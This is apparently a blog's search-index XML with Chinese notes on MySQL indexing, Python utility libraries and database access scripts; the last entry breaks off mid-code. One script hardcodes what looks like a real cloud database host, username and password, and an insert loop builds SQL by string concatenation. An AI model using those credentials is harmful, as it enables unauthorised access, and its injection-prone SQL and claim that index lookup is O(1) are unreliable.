<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>索引</title>
      <link href="2023/04/16/%E7%B4%A2%E5%BC%95/"/>
      <url>2023/04/16/%E7%B4%A2%E5%BC%95/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>① 索引的作用</p><p>② 添加的索引是越多越好吗</p><p>③ 为什么添加的索引不生效</p><p>④ 索引的种类</p><p>⑤ 如何评判一个索引的好坏</p><p>⑥ 如何添加索引才能使索引更加高效</p><h2 id="索引及其作用"><a href="#索引及其作用" class="headerlink" title="索引及其作用"></a>索引及其作用</h2><p>通过索引定位到要读取的页，大大减少了需要扫描的行数。类似字典中通过目录查找对应字所在的页面，时空复杂度为最低的O(1)。</p><h3 id="索引的作用："><a href="#索引的作用：" class="headerlink" title="索引的作用："></a><strong>索引的作用：</strong></h3><ol><li>即上所述，索引能极大的减少扫描行数</li><li>帮助服务器避免排序和临时表</li><li>可以将随机IO 变成 顺序IO</li></ol><p>再看第二点： 帮助服务器避免排序和临时表</p><p>若运行一下语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user order by age desc;</span><br></pre></td></tr></table></figure><p>MySQL的流程</p><p>① 扫描所有行，把所有行加载到内存后，再按age排序生成一张临时表，再把这表排序后将相应行返回给客户端。</p><p>② 对于自动创建的临时表，由于内存临时表的性能更加优越，mysql会优先使用。</p><p>③ 但内存临时表增大到某个阙值（阈值由系统变量max_heap_table_size和tmp_table_size的较小值决定）时，内存临时表就转存为外存临时表，其中tmp_table_size默认是16MB。</p><p>④ 若加了索引，<strong>索引本身是有序的</strong>，所以磁盘读的行数是按age已经排序（默认asc）好的，不会生成临时表、无需额外排序。</p><h3 id="什么是随机IO和顺序IO"><a href="#什么是随机IO和顺序IO" class="headerlink" title="什么是随机IO和顺序IO"></a>什么是随机IO和顺序IO</h3><p>旋转火锅举例：</p><p>假设装一圈需要 4 分钟，则最短等待时间是 0（即菜就在你跟前），最长等待时间是 4 分钟（菜刚好在你跟前错过），那么平均等待时间即为 2 分钟。</p><p><strong>随机</strong> <strong>IO</strong>：假设我们现在要拿四盘菜，这四盘菜随机分配在传输带上，则可知拿到这四盘菜的平均等待时间是 8 分钟。</p><p><strong>顺序</strong> <strong>IO</strong>：如果这四盘菜刚好紧邻着排在一起，则等待时间只需 2 分钟。</p><p><strong>磁道上的菜就类比扇区（sector）中的信息，磁盘块（block）是由多个相邻的扇区组成的，是操作系统读取的最小单元</strong></p><h4 id="顺序IO原理："><a href="#顺序IO原理：" class="headerlink" title="顺序IO原理："></a>顺序IO原理：</h4><p>这样如果信息能以 block 的形式聚集在一起，就能极大减少磁盘 IO 时间,这就是顺序 IO 带来的性能提升。</p><p><img src="https://huangjun1996.gitee.io/2020/07/24/%E7%B4%A2%E5%BC%95/%E9%A1%BA%E5%BA%8FIO.png" alt="img"></p><p><strong>多个扇区组成了一个 block，如果要读的信息都在这个</strong> <strong>block 中，则只需一次 IO 读</strong>。</p><h4 id="随机IO原理："><a href="#随机IO原理：" class="headerlink" title="随机IO原理："></a>随机IO原理：</h4><p>如果信息在一个磁道中分散地分布在各个扇区中，或者分布在不同磁道的扇区上（寻道时间是随机IO主要瓶颈所在），将会造成随机 IO，影响性能。</p><p><img src="https://huangjun1996.gitee.io/2020/07/24/%E7%B4%A2%E5%BC%95/%E9%9A%8F%E6%9C%BAIO.png" alt="img"></p><p>seek Time: 寻道时间，磁头移动到扇区所在的磁道</p><p>Rotational Latency：完成步骤 1 后，磁头移动到同一磁道扇区对应的位置所需求时间</p><p>Transfer Time 从磁盘读取信息传入内存时间</p><p>这其中寻道时间占据了绝大多数的时间（大概占据随机 IO 时间的占 40%）。</p><p><strong>随机 IO 和顺序 IO 大概相差百倍 (随机 IO：10 ms/ page, 顺序 IO 0.1ms / page)，可见顺序 IO 性能之高，索引带来的性能提升显而易见！</strong></p><h2 id="索引的种类"><a href="#索引的种类" class="headerlink" title="索引的种类"></a><strong>索引的种类</strong></h2><p>索引主要分为以下几类</p><p>（1）B+树索引</p><p>（2）哈希索引</p><h3 id="B-树索引"><a href="#B-树索引" class="headerlink" title="B+树索引:"></a>B+树索引:</h3><p><img src="https://huangjun1996.gitee.io/2020/07/24/%E7%B4%A2%E5%BC%95/B+.png" alt="img"></p><p>① B+ 树是以 N 叉树的形式存在的，这样有效降低了树的高度，查找数据也不需要全表扫描了，顺着根节点层层往下查找能很快地找到我们的目标数据。</p><p>② 每个节点的大小即一个磁盘块的大小，一次 IO 会将一个页（每页包含多个磁盘块）的数据都读入（即磁盘预读，程序局部性原理:读到了某个值，很大可能这个值周围的数据也会被用到，干脆一起读入内存）</p><p>③ 叶子节点通过指针的相互指向连接，能有效减少顺序遍历时的随机 IO 并且 叶子节点都是按索引的顺序排序好的，这也意味着根据索引查找或排序都是排序好了的，不会再在内存中形成临时表</p><h3 id="哈希索引"><a href="#哈希索引" class="headerlink" title="哈希索引"></a>哈希索引</h3><p>哈希索引基本散列表实现，散列表（也称哈希表）是根据关键码值(Key value)而直接进行访问的数据结构，它让码值经过哈希函数的转换映射到散列表对应的位置上，查找效率非常高</p><p><img src="https://huangjun1996.gitee.io/2020/07/24/%E7%B4%A2%E5%BC%95/hash.png" alt="img"></p><p>优势：</p><p>对于每一行数据，存储引擎都会对所有的索引列（上图中的 name 列）计算一个哈希码（上图散列表的位置），散列表里的每个元素指向数据行的指针，由于索引自身只存储对应的哈希值，所以索引的结构十分紧凑，这让哈希索引查找速度非常快！</p><p>劣势：</p><p>（1）不支持区间查找</p><p>（2）不支持排序</p><h3 id="生产环境："><a href="#生产环境：" class="headerlink" title="生产环境："></a>生产环境：</h3><p>更多的时候哈希表是与 B Tree等一起使用。</p><p>在 InnoDB 引擎中就有一种名为「自适应哈希索引」的特殊索引，当 innoDB 注意到某些索引值使用非常频繁时，就会内存中基于 B-Tree 索引之上再创建哈希索引，这样也就让 B+ 树索引也有了哈希索引的快速查找等优点，这是完全自动，内部的行为，用户无法控制或配置，不过如果有必要，可以关闭该功能。</p><p>innoDB 引擎本身是不支持显式创建哈希索引的，我们可以在 B+ 树的基础上创建一个伪哈希索引，它与真正的哈希索引不是一回事，它是以哈希值而非键本身来进行索引查找的</p><p>例：</p><p>在 db 某张表中有 url 字段，每个 url 的长度都很长，如果以 url 这个字段创建索引，无疑要占用很大的存储空间，如果能通过哈希（比如CRC32）把此 url 映射成 4 个字节，再以此哈希值作索引 ，索引占用无疑大大缩短！不过在查询的时候要记得<strong>同时带上</strong> <strong>url</strong> <strong>和</strong> <strong>url_crc,</strong>主要是为了避免哈希冲突，导致 <strong>url_crc</strong> <strong>的值可能一样</strong></p><p>SELECT id FROM url WHERE url = “<a href="http://www.baidu.com" target="_blank" rel="noopener" ">http://www.baidu.com”</a> AND url_crc = CRC32(“<a href="http://www.baidu.com" target="_blank" rel="noopener" ">http://www.baidu.com”</a>)</p><p>这样把基于 url 的字符串索引改成了基于 url_crc 的整型索引，效率更高，同时索引占用的空间也大大减少，一举两得，当然人可能会说需要手动维护索引太麻烦了，那可以改进触发器实现。</p><p>除了上文说的两个索引 ，还有空间索引（R-Tree），全文索引等，但是生产中不是很常用。</p><h2 id="高性能索引策略"><a href="#高性能索引策略" class="headerlink" title="高性能索引策略"></a>高性能索引策略</h2><h3 id="（1）加了索引，为何却不生效"><a href="#（1）加了索引，为何却不生效" class="headerlink" title="（1）加了索引，为何却不生效"></a>（1）加了索引，为何却不生效</h3><p>1、索引列是表示式的一部分，或是函数的一部分</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> book_id <span class="keyword">FROM</span> BOOK <span class="keyword">WHERE</span> book_id + <span class="number">1</span> = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">SELECT</span> book_id <span class="keyword">FROM</span> BOOK <span class="keyword">WHERE</span> <span class="keyword">TO_DAYS</span>(<span class="keyword">CURRENT_DATE</span>) - <span class="keyword">TO_DAYS</span>(gmt_create) &lt;= <span class="number">10</span></span><br></pre></td></tr></table></figure><p>上述两个 SQL 虽然在列 book_id 和 gmt_create 设置了索引 ，但由于它们是表达式或函数的一部分，导致索引无法生效，最终导致全表扫描。</p><h3 id="（2）隐式类型转换"><a href="#（2）隐式类型转换" class="headerlink" title="（2）隐式类型转换"></a>（2）隐式类型转换</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">建表：</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`tradelog`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`tradeid`</span> <span class="built_in">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`operator`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`t_modified`</span> datetime <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">   PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">   <span class="keyword">KEY</span> <span class="string">`tradeid`</span> (<span class="string">`tradeid`</span>),</span><br><span class="line">   <span class="keyword">KEY</span> <span class="string">`t_modified`</span> (<span class="string">`t_modified`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4;</span><br><span class="line"></span><br><span class="line">执行 SQL 语句：</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> tradelog <span class="keyword">WHERE</span> tradeid=<span class="number">110717</span>;</span><br></pre></td></tr></table></figure><p>问题：交易编号 tradeid 上有索引，但用 EXPLAIN 执行却发现使用了全表扫描。</p><p>原因：tradeId 的类型是 varchar(32), 而此 SQL 用 tradeid 一个数字类型进行比较，发生了隐形转换，会隐式地将字符串转成整型。</p><p>如下：<br>mysql&gt; SELECT * FROM tradelog WHERE CAST(tradid AS signed int) = 110717;</p><p>触发了第一条，即：索引不能是函数的一部分</p><h3 id="（3）隐式编码转换（非常隐蔽）"><a href="#（3）隐式编码转换（非常隐蔽）" class="headerlink" title="（3）隐式编码转换（非常隐蔽）"></a>（3）隐式编码转换（非常隐蔽）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">建表：</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`trade_detail`</span> ( </span><br><span class="line"> <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>, </span><br><span class="line"> <span class="string">`tradeid`</span> <span class="built_in">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>, </span><br><span class="line"> <span class="string">`trade_step`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>, <span class="comment">/*操作步骤*/</span> </span><br><span class="line"> <span class="string">`step_info`</span> <span class="built_in">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>, <span class="comment">/*步骤信息*/</span> </span><br><span class="line">   PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>), <span class="keyword">KEY</span> <span class="string">`tradeid`</span> (<span class="string">`tradeid`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br></pre></td></tr></table></figure><p>trade_defail 是交易详情<br>tradelog 是操作此交易详情的记录<br>现在要查询 id=2 的交易的所有操作步骤信息，则我们会采用如下方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT d.* FROM tradelog l, trade_detail d WHERE d.tradeid&#x3D;l.tradeid AND l.id&#x3D;2;</span><br></pre></td></tr></table></figure><p>原因：由于 tradelog 与 trade_detail 这两个表的字符集不同，且 tradelog 的字符集是 utf8mb4，而 trade_detail 字符集是 utf8, utf8mb4 是 utf8 的超集，所以会自动将 utf8 转成 utf8mb4。</p><p>即上述语句会发生如下转换:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> d.* <span class="keyword">FROM</span> tradelog l, trade_detail d <span class="keyword">WHERE</span> (<span class="keyword">CONVERT</span>(d.traideid <span class="keyword">USING</span> utf8mb4)))=l.tradeid <span class="keyword">AND</span> l.id=<span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>触发了 「索引列不能是函数的一部分」这条规则</p><p>解决：<br>① 把两个表的字符集改成一样<br>② 如果业务量比较大，生产上不方便改的话，还有一种方案是把 utf8mb4 转成 utf8，如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT d.* FROM tradelog l , trade_detail d WHERE d.tradeid=CONVERT(l.tradeid USING utf8) AND l.id=2;</span><br></pre></td></tr></table></figure><h3 id="（4）使用-order-by-造成的全表扫描"><a href="#（4）使用-order-by-造成的全表扫描" class="headerlink" title="（4）使用 order by 造成的全表扫描"></a>（4）使用 order by 造成的全表扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user ORDER BY age DESC;</span><br></pre></td></tr></table></figure><p>上述语句在 age 上加了索引，但依然造成了全表扫描，这是因为我们使用了 SELECT *,导致回表查询，MySQL 认为回表的代价比全表扫描更大，所以不选择使用索引。</p><p>解决：</p><p>如果想使用到 age 的索引，我们可以用覆盖索引来代替:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT age FROM user ORDER BY age DESC；</span><br></pre></td></tr></table></figure><p>或者加上limit的条件（数据比较小的情况下）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user ORDER BY age DESC limit 10;</span><br></pre></td></tr></table></figure><h2 id="索引设计准则：三星索引"><a href="#索引设计准则：三星索引" class="headerlink" title="索引设计准则：三星索引"></a>索引设计准则：三星索引</h2><p>索引列顺序的经验 法则：将选择性最高的列放在索引的最前列，这种建立在某些场景可能有用，但通常不如避免随机 IO 和 排序那么重要，这里引入索引设计中非常著名的一个准则：三星索引。</p><p>什么是三星索引：<br>第一颗星：WHERE 后面参与查询的列可以组成了单列索引或联合索引<br>第二颗星：避免排序，即如果 SQL 语句中出现 order by colulmn，那取出的结果集就已经是按照column 排序好的，不需要再生成临时表<br>第三颗星：SELECT 对应的列应该尽量是索引列，即尽量避免回表查询。</p><p>对于如下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> age, <span class="keyword">name</span>, city <span class="keyword">where</span> age = xxx <span class="keyword">and</span> <span class="keyword">name</span> = xxx <span class="keyword">order</span> <span class="keyword">by</span> age</span><br></pre></td></tr></table></figure><p>设计的索引应该是 (age, name,city) 或者 (name, age,city)</p><p>实际操作往往只能满足期望中的一颗或两颗星，考虑如下语句:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT age, name, city where age &gt;&#x3D; 10 AND age &lt;&#x3D; 20 and city &#x3D; xxx order by name desc;</span><br></pre></td></tr></table></figure><p>假设我们分别为这三列建了联合索引，则显然它符合第三颗星（使用了覆盖索引）<br>如果索引是（city, age, name)，则虽然满足了第一颗星，但排序无法用到索引，不满足第二颗星<br>如果索引是 (city, name, age)，则第二颗星满足了，但此时 age 在 WHERE 中的搜索条件又无法满足第一星</p><p>另外第三颗星（尽量使用覆盖索引）也无法完全满足，试想我要 SELECT 多列，要把这多列都设置为联合索引吗？<br>这对索引的维护是个问题，因为每一次表的 CURD 都伴随着索引的更新，很可能频繁伴随着页分裂与页合并。</p><p>三星索引总结：实际场景我们一般无法同时满足三星索引，一般我们会优先选择满足第三颗星（因为回表代价较大）至于第一，二颗星就要依赖于实际的成本及实际的业务场景考虑</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第三方库（包)</title>
      <link href="2023/04/16/%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%EF%BC%88%E5%8C%85)/"/>
      <url>2023/04/16/%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%EF%BC%88%E5%8C%85)/</url>
      
        <content type="html"><![CDATA[<h1 id="第三方库（包）"><a href="#第三方库（包）" class="headerlink" title="第三方库（包）"></a>第三方库（包）</h1><h1 id="一-用于数据分析"><a href="#一-用于数据分析" class="headerlink" title="一. 用于数据分析"></a>一. 用于数据分析</h1><p>120.24.99.165</p><h3 id="1-1-faiss"><a href="#1-1-faiss" class="headerlink" title="1.1 faiss"></a>1.1 faiss</h3><p><code>facebook推出的数据分析包，可用于求欧式距离</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> faiss</span><br><span class="line"></span><br><span class="line">data=np.array([[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">1</span>,<span class="number">4</span>]])</span><br><span class="line"></span><br><span class="line">data=data.astype(<span class="string">'float32'</span>)  <span class="comment"># 构建所需数据</span></span><br><span class="line">index = faiss.IndexFlatL2(data.shape[<span class="number">1</span>])   <span class="comment"># build the index</span></span><br><span class="line">print(index.is_trained)</span><br><span class="line">index.add(data)                  <span class="comment"># add vectors to the index</span></span><br><span class="line">print(index.ntotal)</span><br><span class="line">k = <span class="number">4</span>                          <span class="comment"># 查询个数</span></span><br><span class="line">D, I = index.search(data, data.shape[<span class="number">0</span>])   <span class="comment"># 放入需要查询的数据，和检索的个数; 检索全部：data.shape(0)</span></span><br><span class="line">print(I)   <span class="comment"># 下标</span></span><br><span class="line">print(D)   <span class="comment"># 数据值</span></span><br></pre></td></tr></table></figure><h1 id="二-实用包"><a href="#二-实用包" class="headerlink" title="二.  实用包"></a>二.  实用包</h1><h3 id="2-1-tqdm-显示进度条"><a href="#2-1-tqdm-显示进度条" class="headerlink" title="2.1 tqdm 显示进度条"></a>2.1 tqdm 显示进度条</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm_notebook</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式1：</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">100</span>)):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 方式2：</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm_notebook(range(<span class="number">100</span>)):</span><br><span class="line">    time.sleep(<span class="number">0.01</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 方式3：    </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">100</span>):</span><br><span class="line">    time.sleep(<span class="number">0.01</span>)</span><br></pre></td></tr></table></figure><h3 id="2-2-yapf-代码格式化"><a href="#2-2-yapf-代码格式化" class="headerlink" title="2.2 yapf 代码格式化"></a>2.2 yapf 代码格式化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!pip install yapf <span class="comment"># 下载</span></span><br><span class="line">!yapf -i test.py  <span class="comment"># 将python文件格式化后输出</span></span><br></pre></td></tr></table></figure><h3 id="3-sqlalchemy操作数据库"><a href="#3-sqlalchemy操作数据库" class="headerlink" title="3. sqlalchemy操作数据库"></a>3. sqlalchemy操作数据库</h3><h5 id="3-1-read-sql来读取sql"><a href="#3-1-read-sql来读取sql" class="headerlink" title="3.1 read_sql来读取sql"></a>3.1 read_sql来读取sql</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># echo=True是开启调试，这样当我们执行文件的时候会提示相应的文字。</span></span><br><span class="line">engine=create_engine(<span class="string">"mysql+pymysql://root:123456@localhost:3306/guli_edu"</span>,echo=<span class="literal">True</span>)</span><br><span class="line">connect = engine.connect()</span><br><span class="line">sql = <span class="string">"select * from edu_teacher;"</span></span><br><span class="line">result = connect.execute(sql)</span><br><span class="line">df = pd.read_sql(sql, connect)</span><br><span class="line">print(df)</span><br><span class="line"><span class="comment"># print(result.fetchone())</span></span><br><span class="line">connect.close()</span><br></pre></td></tr></table></figure><p>3.2 将sql以读取文件的方式来执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># echo=True是开启调试，这样当我们执行文件的时候会提示相应的文字。</span></span><br><span class="line">engine=create_engine(<span class="string">"mysql+pymysql://root:123456@localhost:3306/guli_edu"</span>,echo=<span class="literal">True</span>)</span><br><span class="line">connect = engine.connect()</span><br><span class="line"></span><br><span class="line">sql_file = <span class="string">"../sql_files/get_all_data.sql"</span></span><br><span class="line">f = open(sql_file, mode=<span class="string">"r"</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">sql = f.read()</span><br><span class="line">df = pd.read_sql(sql, connect)</span><br><span class="line">print(df)</span><br><span class="line">connect.close()</span><br></pre></td></tr></table></figure><h3 id="4-Path操作目录"><a href="#4-Path操作目录" class="headerlink" title="4. Path操作目录"></a>4. Path操作目录</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> ujson <span class="keyword">as</span> json</span><br><span class="line"></span><br><span class="line">out_path = <span class="string">"my_path"</span></span><br><span class="line">work_dir = Path(<span class="string">f"<span class="subst">&#123;out_path&#125;</span>"</span>)</span><br><span class="line">data_dir = work_dir.joinpath(<span class="string">'data'</span>)</span><br><span class="line">data_dir.mkdir(parents=<span class="literal">True</span>,exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">people = &#123;<span class="string">'name'</span>:<span class="string">'zx'</span>,<span class="string">'age'</span>:<span class="number">18</span>&#125;</span><br><span class="line">filename = <span class="string">f"1.json"</span></span><br><span class="line"><span class="keyword">with</span> data_dir.joinpath(filename).open(<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(people,f)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="2023/04/16/%E6%A0%87%E7%AD%BE/"/>
      <url>2023/04/16/%E6%A0%87%E7%AD%BE/</url>
      
        <content type="html"><![CDATA[<p><b><font size="7" color="black">标签 </font></b></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数据分析</title>
      <link href="2023/04/16/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"/>
      <url>2023/04/16/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h1><p><a href="/download/2.rar">get</a></p><h1 id="一-操作数据库"><a href="#一-操作数据库" class="headerlink" title="一. 操作数据库"></a>一. 操作数据库</h1><h3 id="1-1-插入数据"><a href="#1-1-插入数据" class="headerlink" title="1.1 插入数据"></a>1.1 插入数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">插入数据：</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">"studyRes.csv"</span>)</span><br><span class="line"><span class="comment"># 数据库连接参数</span></span><br><span class="line">engine = create_engine(<span class="string">"postgresql://postgres:123456@127.0.0.1:5432/postgres"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(df)):</span><br><span class="line">    export_sql = <span class="string">'insert into '</span> + <span class="string">"public.demo2"</span> + <span class="string">'('</span> + <span class="string">','</span>.join(headers) + <span class="string">') values('</span> + <span class="string">','</span>.join([<span class="string">"'"</span>+str(i)+<span class="string">"'"</span> <span class="keyword">for</span> i <span class="keyword">in</span> df.iloc[i].values]) + <span class="string">')'</span></span><br><span class="line">    engine.execute(export_sql)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mysql.connector</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'rm-bp19or199ue896jkm.mysql.rds.aliyuncs.com'</span></span><br><span class="line"><span class="comment"># HOST = 'basedata-test-in.mysql.rds.aliyuncs.com'</span></span><br><span class="line">DB = <span class="string">'ih'</span></span><br><span class="line">PASSWORD = <span class="string">'M0N0F5wzWhKhqCtl'</span></span><br><span class="line">USER = <span class="string">'sulei'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">selectByMcp</span><span class="params">(sql)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    通过mysql-connector-python 查询</span></span><br><span class="line"><span class="string">    用原始C语言扩展查询 性能会好很多</span></span><br><span class="line"><span class="string">    :param sql:</span></span><br><span class="line"><span class="string">    :return: 结果集</span></span><br><span class="line"><span class="string">    """</span></span><br><span 